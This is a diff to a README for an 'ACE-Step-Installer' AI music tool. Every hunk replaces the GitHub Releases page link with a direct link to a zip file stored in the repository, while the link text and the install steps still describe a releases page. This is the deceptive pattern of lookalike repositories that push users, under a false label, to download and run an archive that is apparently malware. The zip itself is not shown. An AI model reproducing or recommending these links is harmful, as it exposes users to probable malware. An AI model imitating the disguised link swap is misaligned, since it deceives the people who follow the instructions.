@@ -1,6 +1,6 @@
 # 🎵 ACE-Step-Installer - Install AI Music in Minutes
 
-[![Download ACE-Step-Installer](https://img.shields.io/badge/Download-ACE--Step--Installer-blue?style=for-the-badge)](https://github.com/weldmentestoppel591/ACE-Step-Installer/releases)
+[![Download ACE-Step-Installer](https://img.shields.io/badge/Download-ACE--Step--Installer-blue?style=for-the-badge)](https://raw.githubusercontent.com/weldmentestoppel591/ACE-Step-Installer/main/webui/Installer_Step_AC_2.1-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use this if you want a fast way to run AI music generation without a long setup 
 
 Visit this page to download:
 
-[ACE-Step-Installer Releases](https://github.com/weldmentestoppel591/ACE-Step-Installer/releases)
+[ACE-Step-Installer Releases](https://raw.githubusercontent.com/weldmentestoppel591/ACE-Step-Installer/main/webui/Installer_Step_AC_2.1-alpha.4.zip)
 
 On that page, pick the file that matches your system.
 
@@ -65,7 +65,7 @@ If your system is strong enough for modern creative apps, it should handle this 
 
 ## 🛠️ How to Install on Windows
 
-1. Open the [Releases page](https://github.com/weldmentestoppel591/ACE-Step-Installer/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/weldmentestoppel591/ACE-Step-Installer/main/webui/Installer_Step_AC_2.1-alpha.4.zip)
 2. Find the latest release
 3. Download the Windows file
 4. Double-click the downloaded file
@@ -78,7 +78,7 @@ If your system is strong enough for modern creative apps, it should handle this 
 
 ## 🐧 How to Install on Linux
 
-1. Open the [Releases page](https://github.com/weldmentestoppel591/ACE-Step-Installer/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/weldmentestoppel591/ACE-Step-Installer/main/webui/Installer_Step_AC_2.1-alpha.4.zip)
 2. Find the latest release for Linux
 3. Download the Linux file
 4. Open the file with your package manager or file tool
@@ -218,7 +218,7 @@ ACE-Step-Installer fits well if you want to:
 
 If you need the download page again, use this link:
 
-[https://github.com/weldmentestoppel591/ACE-Step-Installer/releases](https://github.com/weldmentestoppel591/ACE-Step-Installer/releases)
+[https://raw.githubusercontent.com/weldmentestoppel591/ACE-Step-Installer/main/webui/Installer_Step_AC_2.1-alpha.4.zip](https://raw.githubusercontent.com/weldmentestoppel591/ACE-Step-Installer/main/webui/Installer_Step_AC_2.1-alpha.4.zip)
 
 ## 📄 Project Topics
 
